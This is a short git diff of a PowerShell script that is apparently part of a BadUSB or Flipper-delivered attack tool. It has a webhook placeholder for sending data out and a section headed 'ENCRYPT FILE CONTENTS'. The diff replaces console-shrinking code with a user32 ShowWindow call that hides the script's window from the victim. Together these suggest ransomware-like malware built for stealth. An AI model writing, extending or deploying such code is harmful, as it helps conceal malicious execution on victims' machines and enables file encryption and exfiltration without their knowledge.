@@ -28,12 +28,14 @@ https://youtu.be/IwfoHN2dWeE
 # Uncomment below if not using a stager (base64 script, flipper etc)
 # $dc = 'WEBHOOK_HERE'
 
-# Setup for the console
-$Host.UI.RawUI.BackgroundColor = "Black"
-Clear-Host
-[Console]::SetWindowSize(1, 1)
-[Console]::SetWindowPosition(10000, 10000)
+# HIDE THE WINDOW - Change to 1 to hide the console window
+$HideWindow = 1
 
+If ($HideWindow -gt 0){
+$Import = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
+add-type -name win -member $Import -namespace native;
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
+}
 # ENCRYPT FILE CONTENTS
 # Define setup variables
 $whuri = "$dc"
